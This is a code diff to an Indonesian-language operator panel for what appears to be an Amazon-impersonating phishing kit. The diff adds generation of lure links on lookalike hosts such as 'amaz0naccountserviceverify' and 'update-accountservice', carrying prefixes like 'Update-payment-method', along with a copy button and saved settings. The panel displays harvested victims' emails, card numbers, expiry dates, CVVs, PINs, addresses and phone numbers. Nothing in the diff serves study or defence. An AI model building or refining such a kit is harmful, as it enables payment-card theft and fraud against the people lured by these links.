@@ -12,7 +12,7 @@
         .wadah { position: relative; z-index: 1; max-width: 900px; margin: 0 auto; }
         .kotak { background: rgba(30,30,50,0.9); border-radius: 12px; padding: 25px; margin-bottom: 20px; border: 1px solid #333; }
         h1 { text-align: center; margin-bottom: 25px; color: #FFD814; }
-        h2 { font-size: 16px; margin-bottom: 15px; border-bottom: 1px solid #444; padding-bottom: 8px; }
+        h2 { font-size: 16px; margin-bottom: 15px; border-bottom: 1px solid #444; padding-bottom: 8px; display: flex; align-items: center; gap: 8px; }
         input, button { width: 100%; padding: 10px; margin: 6px 0; border-radius: 6px; border: none; font-size: 14px; }
         input { background: #2a2a3f; color: #fff; border: 1px solid #444; }
         button { background: #FFD814; color: #000; font-weight: bold; cursor: pointer; margin-top: 10px; }
@@ -21,11 +21,12 @@
         .baris { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
         .baris span { flex: 1; font-size: 13px; word-break: break-all; }
         .sembunyi { display: none; }
-        .tautan-hasil { background: #1a1a2e; padding: 10px; border-radius: 6px; margin-top: 8px; font-family: monospace; font-size: 12px; color: #90EE90; word-break: break-all; }
+        .tautan-hasil { background: #1a1a2e; padding: 10px; border-radius: 6px; margin-top: 8px; font-family: monospace; font-size: 12px; color: #90EE90; word-break: break-all; border: 1px solid #2a4a2a; }
         .data-item { background: #252538; padding: 12px; border-radius: 6px; margin: 8px 0; font-size: 13px; line-height: 1.6; }
         .label { color: #aaa; font-size: 11px; margin-top: 6px; }
-        .terkirim { color: #90EE90; font-size: 12px; margin-top: 5px; }
         .kunci { font-family: monospace; background: #333; padding: 2px 6px; border-radius: 3px; font-size: 11px; }
+        .salin { background: #2a4a2a; color: #90EE90; border: none; padding: 4px 8px; border-radius: 4px; font-size: 12px; cursor: pointer; margin-left: 8px; width: auto; }
+        .salin:hover { background: #3a6a3a; }
     </style>
 </head>
 <body>
@@ -35,7 +36,7 @@
 
         <!-- LOGIN PANEL -->
         <div class="kotak" id="bagianLogin">
-            <h2>Masuk Panel</h2>
+            <h2>🔑 Masuk Panel</h2>
             <input type="text" id="userLogin" placeholder="Username">
             <input type="password" id="passLogin" placeholder="Kata Sandi">
             <button onclick="masukPanel()">Masuk</button>
@@ -46,12 +47,11 @@
             <!-- PENGATURAN TAUTAN -->
             <div class="kotak">
                 <h2>🔗 Pengaturan Tautan Akses</h2>
-                <label>Format Tautan:</label>
-                <div class="tautan-hasil" id="formatTautan">
-                    https://update-accountservice.onrender.com?<span class="kunci">Update-payment-methode-email-random=aktif</span>
-                </div>
-                <input type="text" id="awalanTautan" placeholder="Awalan Tautan" value="Update-payment-methode">
-                <button onclick="simpanTautan()">Simpan Tautan</button>
+                <p class="label">Alamat Website Utama:</p>
+                <input type="text" id="alamatWeb" value="https://update-accountservice.onrender.com" style="color:#90EE90;">
+                <label>Awalan Tautan:</label>
+                <input type="text" id="awalanTautan" placeholder="Awalan Tautan" value="Update-payment-method">
+                <button onclick="simpanTautan()">Simpan & Buat Tautan</button>
                 <div id="tautanTersimpan" class="tautan-hasil sembunyi"></div>
                 <p class="label">Salin tautan di atas dan bagikan. Hanya pengunjung yang lewat tautan ini yang diizinkan.</p>
             </div>
@@ -114,13 +114,19 @@
 
         // === TAUTAN ===
         function simpanTautan() {
-            const awalan = document.getElementById('awalanTautan').value.trim() || 'Update-payment-methode';
-            const tautanContoh = `https://amaz0naccountserviceverify.pythonanywhere.com/?${awalan}-email@contoh.com-123456=aktif`;
+            const alamatWeb = document.getElementById('alamatWeb').value.trim().replace(/\/$/, '');
+            const awalan = document.getElementById('awalanTautan').value.trim() || 'Update-payment-method';
+            const acak = Math.floor(Math.random() * 900000) + 100000;
+            const tautanLengkap = `${alamatWeb}/?${awalan}-email@contoh.com-${acak}=aktif`;
+            
+            localStorage.setItem('alamatWeb', alamatWeb);
             localStorage.setItem('awalanTautan', awalan);
+            
             const el = document.getElementById('tautanTersimpan');
-            el.textContent = tautanContoh;
+            el.innerHTML = tautanLengkap + `<button class="salin" onclick="navigator.clipboard.writeText('${tautanLengkap}')">Salin</button>`;
             el.classList.remove('sembunyi');
         }
+
         function simpanEmail() {
             const email = document.getElementById('emailTujuan').value.trim();
             localStorage.setItem('emailTujuan', email);
@@ -129,6 +135,16 @@
 
         // === TAMPILAN DATA ===
         function tampilkanSemuaData() {
+            // Ambil alamat web yang tersimpan
+            const alamatTersimpan = localStorage.getItem('alamatWeb');
+            if (alamatTersimpan) document.getElementById('alamatWeb').value = alamatTersimpan;
+            
+            const awalanTersimpan = localStorage.getItem('awalanTautan');
+            if (awalanTersimpan) document.getElementById('awalanTautan').value = awalanTersimpan;
+
+            const emailTersimpan = localStorage.getItem('emailTujuan');
+            if (emailTersimpan) document.getElementById('emailTujuan').value = emailTersimpan;
+
             // Login
             const daftarLogin = ambilData('dataLogin');
             const wadahLogin = document.getElementById('daftarLogin');
@@ -151,11 +167,11 @@
                     <div class="data-item">
                         <strong>#${i+1}</strong> — ${d.waktu}
                         <br>📧 Email: ${d.email}
-                        <br>👤 Nama: ${d.namaKartu}
-                        <br>🔢 Kartu: ${d.nomorKartu}
-                        <br>📅 Exp: ${d.expiry} | 🔒 CVV: ${d.cvv}
-                        <br>📍 Alamat: ${d.alamat}, ${d.kota} — ${d.kodepos}
-                        <br>📞 Telp: ${d.telepon}
+                        <br>👤 Nama: ${d.namaKartu || '-'}
+                        <br>🔢 Kartu: ${d.nomorKartu || '-'}
+                        <br>📅 Exp: ${d.expiry || '-'} | 🔒 CVV: ${d.cvv || '-'}
+                        <br>📍 Alamat: ${d.alamat || '-'}, ${d.kota || '-'} — ${d.kodepos || '-'}
+                        <br>📞 Telp: ${d.telepon || '-'}
                         ${d.pin ? `<br>🔐 PIN: ${d.pin}` : ''}
                     </div>`).join('');
 
